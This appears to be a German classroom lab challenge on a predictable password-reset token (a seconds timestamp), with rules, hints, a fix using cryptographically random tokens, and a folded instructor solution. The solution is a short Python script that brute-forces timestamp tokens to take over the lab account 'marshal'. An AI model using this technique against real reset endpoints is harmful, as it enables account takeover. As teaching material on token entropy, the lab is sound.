# Challenge: Vorhersagbares Passwort-Reset-Token

Ziel dieser Übung: Zeigt, dass ein Reset-Token **unvorhersagbar** sein muss.
Hier ist es der Sekunden-Zeitstempel — wer weiß, wann das Reset ausgelöst wurde,
rät ihn in Sekunden und übernimmt das Konto `marshal`.

**Aufbau:** Jede:r startet die App auf dem **eigenen** Rechner; der/die
**Nachbar:in** greift diese Instanz an.

> ```powershell
> $env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5010
> ```

---

## Spielregeln

- Nur die eingeladene Instanz. Nur fiktive Konten. Kein DoS, keine Fremddaten.
- Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

---

## Szenario

Es gibt das Konto `marshal` mit einem starken, unbekannten Passwort. Der
„Passwort vergessen"-Flow schickt (im echten Betrieb) einen Link
`/reset?token=…`. Das Token wird im Lab **nicht** angezeigt — du musst es raten.

## Aufgabe

Setze das Passwort von `marshal` neu und logge dich damit ein.

## Hinweise

- Fordere selbst ein Reset für `marshal` an — und **merke dir die Uhrzeit**.
- Wie könnte ein Token aussehen, das genau in dieser Sekunde erzeugt wurde?
  Ein `int(time.time())` ist eine 10-stellige Zahl.
- Du kennst die Sekunde nicht exakt → probiere ein kleines Fenster
  (z. B. ±5 Sekunden) auf `/reset?token=…` durch.

## Erfolgskriterium

- `/reset` zeigt „Angriff geglückt", und du loggst dich als `marshal` mit
  deinem **neuen** Passwort ein.

## Zählt **nicht** als Lösung

- Das Token aus der Server-Konsole ablesen; den Quelltext als Orakel nutzen.

---

## Verteidigung / Fix

- **Ursache:** Das Token ist **vorhersagbar** (Zeitstempel) und hat quasi keine
  Entropie.
- **Fix:** Kryptographisch zufälliges Token (`secrets.token_urlsafe(32)`),
  kurze Gültigkeit, an das Konto gebunden, nach Gebrauch invalidiert,
  Rate-Limit auf `/reset`.

<details>
<summary>Lösungsweg (für Lehrende / nach der Übung)</summary>

```python
import time, requests
ZIEL = "http://127.0.0.1:5010"
jetzt = int(time.time())
requests.post(ZIEL + "/vergessen", data={"username": "marshal"})
for t in range(jetzt - 5, jetzt + 6):           # kleines Zeitfenster
    r = requests.post(ZIEL + "/reset", data={"token": str(t), "password": "pwned"})
    if "geglueckt" in r.text:
        print("Token:", t); break
requests.post(ZIEL + "/", data={"username": "marshal", "password": "pwned"})
```
</details>
